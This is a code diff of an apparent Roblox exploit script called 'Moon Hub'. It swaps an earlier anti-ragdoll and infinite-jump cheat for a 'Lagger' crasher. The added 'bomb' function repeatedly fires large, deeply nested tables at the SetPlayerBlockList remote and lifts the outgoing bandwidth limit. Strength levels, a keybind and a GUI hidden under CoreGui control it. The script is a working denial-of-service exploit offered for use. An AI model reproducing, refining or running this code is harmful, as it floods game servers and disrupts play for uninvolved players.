@@ -6,209 +6,378 @@ local CoreGui = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
 
 local player = Players.LocalPlayer
-local NEON_COLOR = Color3.fromRGB(0, 170, 255)
-local CONFIG_FILE = "MoonHubantibat.json"
+local ConfigFile = "moonhublagger.json"
 
-local Settings = {
-    AntiBatOn = false,
-    InfJumpOn = false,
-    AntiBatKey = "...",
-    InfJumpKey = "..."
+local NIVELES = {
+	LOW  = { poder = 25 },
+	MID  = { poder = 32 },
+	HIGH = { poder = 70 }
 }
 
+local boundKey = Enum.KeyCode.M
+local nivelActual = "LOW"
+
 local function SaveConfig()
-    pcall(function() writefile(CONFIG_FILE, HttpService:JSONEncode(Settings)) end)
+	local data = {
+		Keybind = boundKey and boundKey.Name or "...",
+		Nivel = nivelActual
+	}
+	pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
 end
 
 local function LoadConfig()
-    pcall(function()
-        if isfile(CONFIG_FILE) then
-            local data = HttpService:JSONDecode(readfile(CONFIG_FILE))
-            Settings.AntiBatKey = data.AntiBatKey or "..."
-            Settings.InfJumpKey = data.InfJumpKey or "..."
-        end
-    end)
+	if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
+		pcall(function()
+			local data = HttpService:JSONDecode(readfile(ConfigFile))
+			if data.Keybind and data.Keybind ~= "..." then
+				boundKey = Enum.KeyCode[data.Keybind]
+			else
+				boundKey = nil
+			end
+			nivelActual = data.Nivel or "LOW"
+		end)
+	end
 end
 LoadConfig()
 
-local function makeDraggable(frame)
-    local dragging, dragInput, dragStart, startPos
-    frame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = frame.Position
-        end
-    end)
-    UserInputService.InputChanged:Connect(function(input)
-        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-            local delta = input.Position - dragStart
-            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
-    UserInputService.InputEnded:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
-    end)
+local function bomb(poder)
+	local main, spam = {}, {{}}
+	local z = spam[1]
+	for i = 1, 25 do 
+		local t = {} 
+		table.insert(z, t) 
+		z = t 
+	end
+	local max = math.min(12000, poder * 50)
+	for i = 1, max do 
+		table.insert(main, spam) 
+	end
+	pcall(function() 
+		game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) 
+	end)
 end
 
-local function createAnimatedStroke(parent, thickness, speed)
-    local stroke = Instance.new("UIStroke")
-    stroke.Thickness = thickness or 1.5
-    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-    stroke.Color = NEON_COLOR
-    stroke.Parent = parent
-    local gradient = Instance.new("UIGradient")
-    gradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 220, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 100, 255))
-    }
-    gradient.Parent = stroke
-    task.spawn(function()
-        local rot = 0
-        while parent and parent.Parent do
-            rot = (rot + (speed or 1.2)) % 360
-            gradient.Rotation = rot
-            task.wait()
-        end
-    end)
+local laggerEnabled = false
+local laggerThread = nil
+
+local function startLaggerLoop()
+	while laggerEnabled do
+		pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
+		bomb(NIVELES[nivelActual].poder)
+		task.wait(0.18)
+	end
+end
+
+local function stopLaggerLoop()
+	laggerEnabled = false
+	if laggerThread then
+		task.cancel(laggerThread)
+		laggerThread = nil
+	end
+end
+
+local switchKnob, switchBg, toggleBtn, buttons
+
+local function setToggle(newState)
+	laggerEnabled = newState
+	local goal = newState and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
+	local color = newState and Color3.fromRGB(0, 130, 255) or Color3.fromRGB(30, 40, 65)
+	
+	if switchKnob and switchBg then
+		TweenService:Create(switchKnob, TweenInfo.new(0.15), {Position = goal}):Play()
+		TweenService:Create(switchBg, TweenInfo.new(0.15), {BackgroundColor3 = color}):Play()
+	end
+
+	if newState then
+		if laggerThread then task.cancel(laggerThread) end
+		laggerEnabled = true
+		laggerThread = task.spawn(startLaggerLoop)
+	else
+		stopLaggerLoop()
+	end
+end
+
+for _, v in pairs(workspace:GetDescendants()) do
+	if v:IsA("Texture") or v:IsA("Decal") then
+		v:Destroy()
+	elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
+		v.Material = Enum.Material.SmoothPlastic
+	end
+end
+
+if not CoreGui:FindFirstChild("HiddenUI") then
+	local f = Instance.new("Folder")
+	f.Name = "HiddenUI"
+	f.Parent = CoreGui
+end
+if CoreGui.HiddenUI:FindFirstChild("CrasherUI_Toggle") then
+	CoreGui.HiddenUI.CrasherUI_Toggle:Destroy()
 end
 
 local gui = Instance.new("ScreenGui")
-gui.Name = "MoonHub_Mini"
+gui.Name = "CrasherUI_Toggle"
 gui.ResetOnSpawn = false
-gui.Parent = CoreGui
+gui.Parent = CoreGui.HiddenUI
+
+local function createAnimatedStroke(parent, thickness, speed)
+	local s = Instance.new("UIStroke")
+	s.Thickness = thickness or 1.5
+	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	s.Color = Color3.new(1, 1, 1)
+	s.Parent = parent
+
+	local g = Instance.new("UIGradient")
+	g.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 25, 60)),
+		ColorSequenceKeypoint.new(0.4, Color3.fromRGB(0, 140, 255)),
+		ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+		ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 140, 255)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 25, 60)),
+	})
+	g.Rotation = 0
+	g.Parent = s
+
+	task.spawn(function()
+		local spd = speed or 1.2
+		while parent and parent.Parent and gui.Parent do
+			g.Rotation = (g.Rotation + spd) % 360
+			task.wait()
+		end
+	end)
+
+	return s, g
+end
 
 local main = Instance.new("Frame")
-main.Size = UDim2.new(0, 260, 0, 175)
-main.Position = UDim2.new(0.5, -130, 0.5, -87)
-main.BackgroundColor3 = Color3.fromRGB(12, 14, 25)
-main.BackgroundTransparency = 0.1
+main.Size = UDim2.new(0, 220, 0, 175)
+main.Position = UDim2.new(0.5, -110, 0.5, -87)
+main.BackgroundColor3 = Color3.fromRGB(8, 12, 28)
+main.BackgroundTransparency = 0.15
+main.ClipsDescendants = true
 main.Active = true
 main.Parent = gui
 
-Instance.new("UICorner", main).CornerRadius = UDim.new(0, 14)
-createAnimatedStroke(main, 2.2, 0.8)
-makeDraggable(main)
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 10)
+mainCorner.Parent = main
 
--- Kutu kaldırıldı, yazı doğrudan 'main' paneline hizalandı
+createAnimatedStroke(main, 2, 0.8)
+
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 30)
-title.Position = UDim2.new(0, 0, 0, 12)
+title.Size = UDim2.new(1, -24, 0, 30)
+title.Position = UDim2.new(0, 12, 0, 6)
 title.BackgroundTransparency = 1
 title.Text = "Moon Hub"
 title.Font = Enum.Font.GothamBlack
-title.TextSize = 18 -- Yazıyı biraz daha belirgin yapmak için boyutu hafifçe artırıldı
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 16
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextXAlignment = Enum.TextXAlignment.Left
 title.Parent = main
 
-local InfJumpPart = nil
-RunService.Heartbeat:Connect(function()
-    if Settings.AntiBatOn then
-        pcall(function()
-            local char = player.Character
-            local root = char and char:FindFirstChild("HumanoidRootPart")
-            local hum = char and char:FindFirstChildOfClass("Humanoid")
-            if root and hum then
-                local ov = root.Velocity
-                root.Velocity = Vector3.new(4000, ov.Y, 4000)
-                RunService.RenderStepped:Wait()
-                root.Velocity = Vector3.new(ov.X, root.Velocity.Y, ov.Z)
-                if hum:GetState() == Enum.HumanoidStateType.Ragdoll or hum:GetState() == Enum.HumanoidStateType.FallingDown then
-                    hum:ChangeState(Enum.HumanoidStateType.Running)
-                end
-            end
-        end)
-    end
-    if Settings.InfJumpOn then
-        local char = player.Character
-        local root = char and char:FindFirstChild("HumanoidRootPart")
-        local hum = char and char:FindFirstChildOfClass("Humanoid")
-        if root and hum then
-            if UserInputService:IsKeyDown(Enum.KeyCode.Space) or hum.Jump then
-                if not InfJumpPart then
-                    InfJumpPart = Instance.new("Part", workspace)
-                    InfJumpPart.Size = Vector3.new(8, 0.5, 8)
-                    InfJumpPart.Anchored, InfJumpPart.Transparency = true, 1
-                end
-                InfJumpPart.Position = root.Position - Vector3.new(0, 3.5, 0)
-                if root.Velocity.Y < 50 then root.Velocity = Vector3.new(root.Velocity.X, 50, root.Velocity.Z) end
-            elseif InfJumpPart then InfJumpPart.Position = Vector3.new(0, -1000, 0) end
-        end
-    elseif InfJumpPart then InfJumpPart.Position = Vector3.new(0, -1000, 0) end
+local titleGrad = Instance.new("UIGradient")
+titleGrad.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 160, 255)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 160, 255)),
+})
+titleGrad.Parent = title
+
+task.spawn(function()
+	while main.Parent and gui.Parent do
+		titleGrad.Rotation = (titleGrad.Rotation + 1.2) % 360
+		task.wait()
+	end
 end)
 
-local function createFeature(text, yOffset, featureType)
-    local row = Instance.new("Frame")
-    row.Size = UDim2.new(1, -20, 0, 42)
-    row.Position = UDim2.new(0, 10, 0, yOffset)
-    row.BackgroundColor3 = Color3.fromRGB(22, 25, 42)
-    row.Parent = main
-    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 10)
-    createAnimatedStroke(row, 1.2, 1)
+local toggleRow = Instance.new("Frame")
+toggleRow.Size = UDim2.new(1, -20, 0, 34)
+toggleRow.Position = UDim2.new(0, 10, 0, 42)
+toggleRow.BackgroundColor3 = Color3.fromRGB(18, 26, 48)
+toggleRow.Parent = main
 
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(0.4, 0, 1, 0)
-    label.Position = UDim2.new(0, 10, 0, 0)
-    label.BackgroundTransparency = 1
-    label.Text = text
-    label.Font = Enum.Font.GothamBold
-    label.TextSize = 13
-    label.TextColor3 = Color3.fromRGB(255, 255, 255)
-    label.TextXAlignment = Enum.TextXAlignment.Left
-    label.Parent = row
+Instance.new("UICorner", toggleRow)
+createAnimatedStroke(toggleRow, 1, 1.2)
 
-    local kbBtn = Instance.new("TextButton")
-    kbBtn.Size = UDim2.new(0, 55, 0, 24)
-    kbBtn.Position = UDim2.new(1, -95, 0.5, -12)
-    kbBtn.BackgroundColor3 = Color3.fromRGB(30, 32, 55)
-    kbBtn.Text = Settings[featureType.."Key"]
-    kbBtn.Font = Enum.Font.GothamBold
-    kbBtn.TextSize = 11
-    kbBtn.TextColor3 = NEON_COLOR
-    kbBtn.Parent = row
-    Instance.new("UICorner", kbBtn).CornerRadius = UDim.new(0, 6)
-    createAnimatedStroke(kbBtn, 1, 2)
+local toggleLabel = Instance.new("TextLabel")
+toggleLabel.Size = UDim2.new(1, -60, 1, 0)
+toggleLabel.Position = UDim2.new(0, 10, 0, 0)
+toggleLabel.BackgroundTransparency = 1
+toggleLabel.Text = "Lagger"
+toggleLabel.Font = Enum.Font.GothamBlack
+toggleLabel.TextSize = 13
+toggleLabel.TextColor3 = Color3.new(1, 1, 1)
+toggleLabel.TextXAlignment = Enum.TextXAlignment.Left
+toggleLabel.Parent = toggleRow
 
-    local switch = Instance.new("Frame")
-    switch.Size = UDim2.new(0, 32, 0, 18)
-    switch.Position = UDim2.new(1, -38, 0.5, -9)
-    switch.BackgroundColor3 = Color3.fromRGB(45, 48, 70)
-    switch.Parent = row
-    local knob = Instance.new("Frame")
-    knob.Size = UDim2.new(0, 14, 0, 14)
-    knob.Position = UDim2.new(0, 2, 0.5, -7)
-    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    knob.Parent = switch
-    Instance.new("UICorner", switch).CornerRadius = UDim.new(0, 9)
-    Instance.new("UICorner", knob).CornerRadius = UDim.new(0, 7)
+switchBg = Instance.new("Frame")
+switchBg.Size = UDim2.new(0, 36, 0, 18)
+switchBg.Position = UDim2.new(1, -46, 0.5, -9)
+switchBg.BackgroundTransparency = 1
+switchBg.Parent = toggleRow
 
-    local function update()
-        local on = Settings[featureType.."On"]
-        TweenService:Create(knob, TweenInfo.new(0.2), {Position = on and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)}):Play()
-        TweenService:Create(switch, TweenInfo.new(0.2), {BackgroundColor3 = on and NEON_COLOR or Color3.fromRGB(45, 48, 70)}):Play()
-    end
-    update()
+Instance.new("UICorner", switchBg).CornerRadius = UDim.new(0, 9)
+createAnimatedStroke(switchBg, 2, 1.5)
 
-    row.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then Settings[featureType.."On"] = not Settings[featureType.."On"] update() end end)
+switchKnob = Instance.new("Frame")
+switchKnob.Size = UDim2.new(0, 14, 0, 14)
+switchKnob.Position = UDim2.new(0, 2, 0.5, -7)
+switchKnob.BackgroundColor3 = Color3.new(1, 1, 1)
+switchKnob.Parent = switchBg
 
-    local listen = false
-    kbBtn.MouseButton1Click:Connect(function() listen = true kbBtn.Text = "..." end)
-    UserInputService.InputBegan:Connect(function(i)
-        if listen and i.UserInputType == Enum.UserInputType.Keyboard then
-            local key = tostring(i.KeyCode):gsub("Enum.KeyCode.", "")
-            Settings[featureType.."Key"] = key
-            kbBtn.Text = key
-            listen = false
-            SaveConfig()
-        elseif not listen and i.UserInputType == Enum.UserInputType.Keyboard then
-            if tostring(i.KeyCode):gsub("Enum.KeyCode.", "") == Settings[featureType.."Key"] then
-                Settings[featureType.."On"] = not Settings[featureType.."On"]
-                update()
-            end
-        end
-    end)
+Instance.new("UICorner", switchKnob).CornerRadius = UDim.new(0, 7)
+
+toggleBtn = Instance.new("TextButton")
+toggleBtn.Size = UDim2.new(1, 0, 1, 0)
+toggleBtn.BackgroundTransparency = 1
+toggleBtn.Text = ""
+toggleBtn.Parent = toggleRow
+
+toggleBtn.MouseButton1Click:Connect(function()
+	setToggle(not laggerEnabled)
+end)
+
+local kbRow = Instance.new("Frame")
+kbRow.Size = UDim2.new(1, -20, 0, 34)
+kbRow.Position = UDim2.new(0, 10, 0, 82)
+kbRow.BackgroundColor3 = Color3.fromRGB(18, 26, 48)
+kbRow.Parent = main
+
+Instance.new("UICorner", kbRow)
+createAnimatedStroke(kbRow, 1, 1.2)
+
+local kbLabel = Instance.new("TextLabel")
+kbLabel.Size = UDim2.new(1, -80, 1, 0)
+kbLabel.Position = UDim2.new(0, 10, 0, 0)
+kbLabel.BackgroundTransparency = 1
+kbLabel.Text = "Keybind"
+kbLabel.Font = Enum.Font.GothamBlack
+kbLabel.TextSize = 13
+kbLabel.TextColor3 = Color3.new(1, 1, 1)
+kbLabel.TextXAlignment = Enum.TextXAlignment.Left
+kbLabel.Parent = kbRow
+
+local kbBtn = Instance.new("TextButton")
+kbBtn.Size = UDim2.new(0, 65, 0, 22)
+kbBtn.Position = UDim2.new(1, -73, 0.5, -11)
+kbBtn.BackgroundColor3 = Color3.fromRGB(30, 42, 75)
+kbBtn.AutoButtonColor = false
+kbBtn.Font = Enum.Font.GothamBlack
+kbBtn.TextSize = 10
+kbBtn.TextColor3 = Color3.new(1, 1, 1)
+kbBtn.Parent = kbRow
+
+Instance.new("UICorner", kbBtn).CornerRadius = UDim.new(0, 5)
+createAnimatedStroke(kbBtn, 1.2, 1.2)
+
+local function actualizarKeybindButton()
+	kbBtn.Text = boundKey and ("[ " .. boundKey.Name .. " ]") or "[ ... ]"
+end
+actualizarKeybindButton()
+
+local listeningForKey = false
+
+kbBtn.MouseButton1Click:Connect(function()
+	listeningForKey = true
+	kbBtn.Text = "[ ... ]"
+end)
+
+UserInputService.InputBegan:Connect(function(input, gpe)
+	if gpe then return end
+	if listeningForKey then
+		if input.UserInputType == Enum.UserInputType.Keyboard then
+			boundKey = input.KeyCode
+			actualizarKeybindButton()
+			listeningForKey = false
+			SaveConfig()
+		end
+		return
+	end
+	if boundKey and input.KeyCode == boundKey then
+		setToggle(not laggerEnabled)
+	end
+end)
+
+local modeRow = Instance.new("Frame")
+modeRow.Size = UDim2.new(1, -20, 0, 34)
+modeRow.Position = UDim2.new(0, 10, 0, 124)
+modeRow.BackgroundTransparency = 1
+modeRow.Parent = main
+
+local UIListLayout = Instance.new("UIListLayout")
+UIListLayout.FillDirection = Enum.FillDirection.Horizontal
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Padding = UDim.new(0, 7)
+UIListLayout.Parent = modeRow
+
+buttons = {}
+local function updateModeButtons()
+	for name, btn in pairs(buttons) do
+		if nivelActual == name then
+			TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(0, 130, 255)}):Play()
+		else
+			TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(18, 26, 48)}):Play()
+		end
+	end
 end
 
-createFeature("Anti Bat", 55, "AntiBat")
-createFeature("Inf Jump", 105, "InfJump")
+local function createModeButton(name, order)
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(0, 62, 1, 0)
+	btn.LayoutOrder = order
+	btn.BackgroundColor3 = Color3.fromRGB(18, 26, 48)
+	btn.Font = Enum.Font.GothamBlack
+	btn.Text = name
+	btn.TextSize = 11
+	btn.TextColor3 = Color3.new(1, 1, 1)
+	btn.AutoButtonColor = false
+	btn.Parent = modeRow
+
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+	createAnimatedStroke(btn, 1.2, 1.2)
+	
+	buttons[name] = btn
+
+	btn.MouseButton1Click:Connect(function()
+		nivelActual = name
+		updateModeButtons()
+		SaveConfig()
+	end)
+end
+
+createModeButton("LOW", 1)
+createModeButton("MID", 2)
+createModeButton("HIGH", 3)
+updateModeButtons()
+
+local dragging, dragInput, dragStart, startPos
+
+local function update(input)
+	local delta = input.Position - dragStart
+	main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+main.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = main.Position
+		
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+main.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		update(input)
+	end
+end)
